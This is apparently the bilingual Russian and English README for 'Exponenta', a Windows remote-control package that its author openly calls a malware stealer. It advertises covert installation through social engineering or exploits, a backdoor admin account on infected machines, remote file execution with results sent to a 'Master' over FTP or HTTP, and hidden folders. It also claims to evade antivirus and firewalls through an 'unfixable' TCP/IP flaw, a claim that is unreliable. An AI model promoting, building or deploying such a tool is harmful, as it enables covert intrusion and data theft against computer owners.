EXPONENTA
=====
Набор пакетов для удалённого администрирования (Admin Pack) компьютерами под управлением операционной системы Windows.

Пакет для удалённого взлома компьютера и управления. «Зловред» универсальный, поэтому автор не указывает  его класс. Близкий класс в категории зловредов — стайлеры (Stealer). Антивирусами программное обеспечение обозначается как malware-gen.

Для работы «зловред» требует дополнительные пакеты и программы. Ссылки — в документации.

ЗАЯВЛЕННЫЕ ФУНКЦИИ
====

- Возможна скрытая установка методами социальной инженерии.

- Возможна скрытая установка с использованием уязвимостей Windows.

- В работе требует права локального администратора.

- Скрытно устанавливает пакеты на заражённый компьютер.

- Запускает файлы на удалённом компьютере. Результат передаётся «Хозяину» по FTP либо по HTTP протоколу.

- Даёт возможность удалённо включать доступ по telnet, winrm, ssh, rdp, smb протоколам.

- Создаёт "универсальную" учётную запись для доступа к компьютеру по указанным протоколам с правами локального администратора или администратора домена.

- Собственно «зловред» запускается с закрытого сайта, программы для создания которого также приводятся.

- Возможность изменения переменных окружения и кустов реестра.

- Возможность установки пакетов инсталляторами со штатными деинсталляторами, с записью в реестре Windows.

- Публичная доступность Admin Packs для скачки по http и ftp протоколам.

- Возможность отмены сделанных изменений на компьютере и полного удаления пакета программ средствами штатных деинсталляторов.

СИСТЕМНЫЕ ТРЕБОВАНИЯ
====

- Компьютер с установленной Microsoft Windows 7 SP1 — Windows 10 Pro или Microsoft Windows Server 2008 R2 — 2016.

- Учётная запись локального администратора компьютера или администратора домена.

- Установленные в системе пакеты PowerShell 2.0, Console FTP client, systeminfo.exe. Эти пакеты изначально присутствуют на указанных компьютерах, просто эти пакеты не должны быть удалены администратором.

НЕОБХОДИМЫЕ ДОПОЛНИТЕЛЬНЫЕ ПАКЕТЫ ДЛЯ РАБОТЫ

- Менеджер пакетов chocolatey.

- Модифицированная программа Elevation.

- Зарегистрированная программа Hidden Start.

- Программа duck — консольный клиент для обмена информацией с облачными сервисами.

- Установленный из Chocolatey пакет sysinternals.

- Установленный из Chocolatey пакет curl.

- Установленный из Chocolatey пакет wget.

Программа Exponenta устанавливает эти пакеты сразу же после собственной инсталляции.

Данные пакеты входят в Admin Pack, и будут установлены в любом случае, даже без инсталляции боевых модулей «зловреда». Этот модуль устанавливается и удаляется опционально. Возможна установка Admin Pack для облегчения работы администратора без боевого модуля, при этом править файлы конфигурации практически не потребуется.

Все плагины к стайлеру Exponenta (полнофункциональные Admin Pack) скачиваются и устанавливаются в каталог c:\pub1\Distrib\plugins ведомого компьютера. Их установка из этой папки может производиться в автоматическом режиме либо вручную, администратором ведомого компьютера. На всякий случай папка c:\pub1 должна иметь атрибут "скрытый" для всех пользователей.

ИНСТАЛЛЯЦИЯ ПРОГРАММНОГО ОБЕСПЕЧЕНИЯ
====

Посмотрите файл INSTALL.MD в каталоге с готовыми плагинами для Windows (только на русском языке)

ПЕРЕСБОРКА ПРОГРАММЫ И ПЛАГИНОВ ДЛЯ ИНСТАЛЛЯЦИИ
=====

Посмотрите соответствующие файлы README.MD в каталогах с исходным кодом (только на русском языке).

ДОПОЛНИТЕЛЬНО
=====

Компоненты стайлера не относятся к вирусам и нежелательным программам и поэтому не опознаются антивирусными программами. Стайлер эксплуатирует уязвимость стека протоколов TCP/IP, которую заложили разработчики в него на этапе создания Интернета в 80-х годах XX века, и не будет исправима по определению. Установленный стайлер обнаруживается только программами аудита и отслеживания проникновений, а также, в меньшей степени, сниферами трафика и аппаратными сетевыми фильтрами. Использование брандмауэров для предотвращения заражения бесполезно, как и антивирусов. Надёжная защита против заражения стайлером — корпоративная культура работы с входящими сообщениями в организации.

КОНТАКТЫ
===

По вопросам тестового использования, обнаружения заражения обратитесь к автору  по e-mail, ICQ 120105414, Messenger и Telegram (@yudenisov), WhatsApp/Viber. Автор не даёт консультации по криминальному использованию этой программы, равно как использование программы террористами и спецслужбами. Такие вопросы обсуждаются на соответствующих форумах. :-)

Консультации по использованию программы и предотвращения заражения платные. Консультации доступны только на русском языке. Стоимость консультаций уточняйте при обращении, фиксированной цены нет. Оплата идёт по безналичному расчёту или через платёжные сервисы или банки.

EXPONENTA
=====
It is a set of packets and scripts for remote administration (Admin Pack) of computers working under Windows Operation Systems.

It is a packet for remote computer hacking and control of it. It combines a set of functions therefore the author cannot carry it to a certain class of malwares. The most close class in category of malwares — stealer.

This package requires additional packets and the software for the operation. References to them can be found in documentation.

THE STATED FUNCTIONS
====

- The hidden installation is possible by methods of social engineering.

- The hidden installation is possible by windows exploits.

- It makes possible to get remotely access to slave computer with telnet, winrm, ssh, rdp, smb protocols.

- It creates «universal» account for remote access to slave computer on these protocols with local administrator or domain administrator rights.

- Actually "malware" is started from the closed website, programs for its creation are also provided.

- It makes possible changing of environment variables and registry records.

- It makes possible to setup packets by its own installators with uninstallers and setting up the records in Windows Registry;

- The Admin Pack is enabled for public download on http and ftp protocols.

- It is possible to canceled the changes of computer state and full delete of all packets by mean of its own uninstallers.

- The program requires the right of the local administrator by the operation.

- The program allows to hidden install packages on the infected computer.

- The program allows to launch files on the remote computer. The result of operation of these programs is transferred to “Master” on FTP or HTTP protocol.

SYSTEM REQUIREMENTS
=====

- The computer with Microsoft Windows 7 SP1 — Microsoft Windows 10 Pro or Microsoft Windows Server 2008 R2 — 2016 to be installed.

- The account of a local administrator of a computer or a domain administrator is present.

- Packages of the PowerShell 2.0, the console FTP client, the systeminfo.exe shall be installed in system. These packets are present at the specified systems initially, they shall not be removed by the administrator at all.

NECESSARY ADDITIONAL PACKETS FOR OPERATION
=====

- Chocolatey Package Manager.

- The modified version of the Elevation program.

- The registered version of the Hidden Start program.

- The duck program is a console client for synchronization of cloud services.

- The installed sysinternals package from Chocolatey.

- The installed curl package from Chocolatey.

- The installed wget package from Chocolatey.

The Exponenta program sets up them at once after the installation.

These packets enter at  Admin Pack, and will be set up anyway, even without installation of fighting modules of "malware". This module is established and removed optionally. The Admin Pack installation for simplification of the administrator work without fighting module is possible, at the same time it will not be required to edit  configuration files practically.

All plug-ins to a stayler of Exponenta (full-functional Admin Packs) are downloaded and established in the c:\pub1\Distrib\plugins slave computer directory. Their installation from this folder can be made in the automatic mode or manually, by the administrator of the slave computer. Just in case the c:\pub1 folder should have attribute "hidden" for all users.

INSTALLATION OF THE SOFTWARE
====

Look at the INSTALL.MD file in the directory with ready Windows modules (only in Russian)

REMODULAR ASSEMBLY FOR INSTALLATION
====

Look at the appropriate README.MD files in directories with the initial modules (only in Russian).

IN ADDITION
====

Both the main modules of a stealer, and its plug-ins do not belong to malwares and potentially unwanted programs and therefore they are not identified by anti-virus programs. Stealer exploits the general vulnerability of a stack of protocols of TCP/IP which was put in it at a development stage of the Internet in the eighties of the 20th century, and will never be corrected by determination. This stealer can be found only by programs of audit of system and tracing of penetrations and also, to a lesser extent, sniffers of a traffic and the hardware supply line filters. Using of firewalls, as well as antiviruses for preventing of infection with this stealer is a useless occupation.

All consultations on use of the program and preventing of infection are paid. Consultations are available only in Russian. Specify the cost of consultations in case of the address. The fixed price does not exist. Payment by bank transfer or through payment service providers and banks.
